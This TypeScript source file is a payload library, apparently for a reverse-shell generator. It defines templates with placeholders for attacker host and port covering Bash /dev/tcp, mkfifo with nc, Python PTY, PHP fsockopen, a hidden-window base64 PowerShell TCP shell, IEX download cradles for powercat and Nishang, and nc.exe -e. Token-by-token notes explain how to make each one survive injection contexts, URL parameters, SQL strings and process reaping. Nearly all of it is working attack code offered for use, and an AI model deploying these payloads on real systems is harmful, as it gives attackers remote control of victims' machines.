import type { PayloadDef } from "./types";

const SH_PART = { token: "/bin/sh -i", explain: "-i: interactive shell. /bin/sh is used because it exists everywhere; the pipe, not the shell, does the work." };
const FIFO_PARTS = [
  { token: "rm -f /tmp/f", explain: "-f: no error if the pipe does not exist yet; clears a stale one from a previous try." },
  { token: "mkfifo /tmp/f", explain: "Builds the named pipe that carries your keystrokes back into the shell." },
  { token: "cat /tmp/f", explain: "Feeds whatever arrives on the pipe into the shell's stdin." },
  SH_PART,
  { token: "2>&1", explain: "Sends errors down the same pipe so you see them." },
  { token: "nc", explain: "Opens the connection to your listener. No -e: OpenBSD nc, the default on most distros, does not have it." },
  { token: "> /tmp/f", explain: "Writes your replies into the pipe, closing the loop." },
];
const FIFO = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {LHOST} {LPORT} > /tmp/f";
const BASH_C_PART = { token: "bash -c", explain: "-c: run the quoted string. Added outside a real bash prompt (injection, URL, system()) so dash does not choke on the payload." };
const ALL_LINUX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"] as const;
const POWERSHELL_SCRIPT =
  '$client = New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};' +
  "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
  '$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";' +
  "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";

export const REVERSE_SHELLS: PayloadDef[] = [
  {
    id: "bash-tcp", generator: "shell", title: "Bash /dev/tcp", os: "linux",
    contexts: ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"],
    requires: ["bash"],
    template: "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    parts: [
      { token: "bash -i", explain: "-i: interactive bash. /dev/tcp is a bash feature, so sh or dash cannot run this unwrapped." },
      { token: ">&", explain: "Sends stdout and stderr to the socket." },
      { token: "/dev/tcp/", explain: "Bash's built-in pseudo-device: opens a TCP connection to host/port." },
      { token: "0>&1", explain: "Feeds the socket back in as stdin, so you can type." },
      { token: "bash -c", explain: "-c: added outside a real bash prompt (injection, URL, system()) so dash does not choke on >& and /dev/tcp." },
    ],
    listener: "penelope",
  },
  {
    id: "mkfifo-nc", generator: "shell", title: "mkfifo + nc", os: "linux",
    contexts: [...ALL_LINUX], requires: ["nc"], template: FIFO, parts: [...FIFO_PARTS, BASH_C_PART], listener: "penelope",
    notes: ["Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e')."],
  },
  {
    id: "mkfifo-nc-bg", generator: "shell", title: "mkfifo + nc, backgrounded", os: "linux",
    contexts: [...ALL_LINUX], requires: ["nc"], template: `(${FIFO}) &`,
    parts: [
      { token: "( ", explain: "Subshell: groups the whole chain so it can be detached as one job." },
      ...FIFO_PARTS,
      BASH_C_PART,
      { token: ") &", explain: "Backgrounds the group so it survives a parent that reaps its children (UDF, popen, request worker)." },
    ],
    listener: "penelope", background: true,
    notes: ["Use when the shell connects and then dies at once: the parent process is reaping it."],
  },
  {
    id: "python3", generator: "shell", title: "Python 3 with PTY", os: "linux",
    contexts: [...ALL_LINUX], requires: ["python3"],
    template: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{LHOST}",{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
    parts: [
      { token: "python3 -c", explain: "-c: run the quoted program. Use python on old hosts (which python3 python)." },
      { token: "s.connect(", explain: "Opens the TCP connection back to your listener." },
      { token: "os.dup2(", explain: "Points stdin, stdout and stderr (0,1,2) at the socket." },
      { token: "pty.spawn(", explain: "Starts bash on a PTY, so su and sudo prompts work from the first prompt." },
      BASH_C_PART,
    ],
    listener: "penelope",
  },
  {
    id: "php-exec", generator: "shell", title: "PHP fsockopen", os: "linux",
    contexts: [...ALL_LINUX], requires: ["php"],
    template: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    parts: [
      { token: "php -r", explain: "-r: run the quoted PHP code, no <?php tag needed." },
      { token: "fsockopen(", explain: "Opens the TCP connection to your listener." },
      { token: "/bin/sh -i", explain: "-i: interactive shell, wired to the socket below." },
      { token: "<&3 >&3 2>&3", explain: "Assumes the socket is file descriptor 3. If nothing arrives, try 4 or 5." },
      BASH_C_PART,
    ],
    listener: "penelope",
  },
  {
    id: "ps-b64", generator: "shell", title: "PowerShell base64 (-e)", os: "windows",
    contexts: ["cmd", "powershell", "webshell-param", "url-param", "macro"],
    requires: ["powershell"], template: POWERSHELL_SCRIPT, encodePowerShell: true,
    parts: [
      { token: "powershell", explain: "Starts PowerShell. One token, so no quoting breaks in cmd, a URL or a SQL string." },
      { token: "-nop", explain: "-nop: no profile, so nothing slows or alters the start." },
      { token: "-w hidden", explain: "-w hidden: no visible window on the target." },
      { token: "-e", explain: "-e (same as -enc, -EncodedCommand): the argument is base64 of UTF-16LE text. Plain UTF-8 base64 produces garbage." },
    ],
    listener: "penelope",
    notes: ["A working shell makes the web request hang. If it returns at once, the payload did not hold the socket."],
  },
  {
    id: "powercat-cradle", generator: "shell", title: "powercat cradle (in memory)", os: "windows",
    contexts: ["powershell"], requires: ["powershell", "served-file"],
    template: "IEX(New-Object System.Net.WebClient).DownloadString('http://{LHOST}/powercat.ps1');powercat -c {LHOST} -p {LPORT} -e powershell",
    parts: [
      { token: "IEX(", explain: "Runs the downloaded text as code, so nothing is written to disk." },
      { token: "DownloadString('http://", explain: "Fetches powercat.ps1 from your web server." },
      { token: "powercat -c", explain: "-c: connect out to the listener." },
      { token: "-p", explain: "-p: the listener's port." },
      { token: "-e powershell", explain: "-e: program to attach to the socket. Use cmd for a cmd shell." },
    ],
    listener: "penelope", serve: "python3 -m http.server 80",
    notes: ["Run from a PowerShell prompt. To use it from cmd, a macro or a SQL string, base64 it for -e first."],
  },
  {
    id: "nishang-cradle", generator: "shell", title: "Nishang cradle (served rev.ps1)", os: "windows",
    contexts: ["cmd", "powershell", "sql-string"], requires: ["powershell", "served-file"],
    template: `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}/rev.ps1')"`,
    parts: [
      { token: "powershell", explain: "Starts PowerShell." },
      { token: "-nop", explain: "-nop: no profile." },
      { token: "-w hidden", explain: "-w hidden: no visible window." },
      { token: "-c", explain: "-c: run the following command text. Double-quoted so a PowerShell prompt passes it through instead of evaluating the (...) itself." },
      { token: "IEX(", explain: "Runs the downloaded rev.ps1 in memory." },
      { token: "rev.ps1", explain: "Your served reverse-shell script. It has LHOST and LPORT inside, so regenerate it after a VPN IP change." },
    ],
    listener: "penelope", bakesIp: true, serve: "python3 -m http.server 80",
    notes: ["Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'."],
  },
  {
    id: "nc-exe", generator: "shell", title: "nc.exe -e", os: "windows",
    contexts: ["cmd", "powershell", "webshell-param", "url-param"], requires: ["nc-e"],
    template: "{FILE} -e cmd.exe {LHOST} {LPORT}", defaults: { FILE: "C:\\Windows\\Temp\\nc.exe" },
    parts: [
      { token: "nc.exe", explain: "The uploaded netcat. Defender may delete it: check it is still there if nothing arrives." },
      { token: "-e", explain: "-e: run this program and attach it to the socket." },
      { token: "cmd.exe", explain: "The program handed to the connection." },
    ],
    listener: "penelope",
    notes: ["Needs an nc.exe built with -e; if it returns instantly, the build has no -e."],
  },
];
